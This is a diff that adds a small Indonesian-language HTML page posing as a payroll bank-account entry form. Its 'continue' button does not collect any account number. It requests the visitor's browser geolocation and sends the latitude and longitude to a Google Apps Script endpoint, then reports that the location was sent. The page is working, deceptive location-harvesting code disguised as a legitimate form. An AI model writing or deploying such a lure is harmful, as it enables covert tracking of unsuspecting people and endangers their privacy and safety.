@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Input rekening penggajian</title>
+</head>
+<body>
+  <h3>Klik tombol lanjutkan untuk isi nomore rekenig untuk penggajian</h3>
+  <button onclick="getLocation()">Lanjutkan</button>
+
+  <script>
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocation, showError);
+      } else {
+        alert("Browser Anda tidak mendukung geolokasi.");
+      }
+    }
+
+    function sendLocation(position) {
+      const data = {
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude
+      };
+
+      fetch("https://script.google.com/macros/s/AKfycbzaM2IrpoN4Oe9h75o9lm3G0jrtlJpMSEJH45a6H63Oqq34Rozqt4hMFlq4pTXP59Q5lQ/exec", {
+        method: "POST",
+        body: JSON.stringify(data),
+        headers: {
+          "Content-Type": "application/json"
+        }
+      }).then(() => {
+        alert("Lokasi berhasil dikirim!");
+      }).catch(() => {
+        alert("Gagal mengirim lokasi.");
+      });
+    }
+
+    function showError(error) {
+      alert("Gagal mendapatkan lokasi: " + error.message);
+    }
+  </script>
+</body>
+</html>
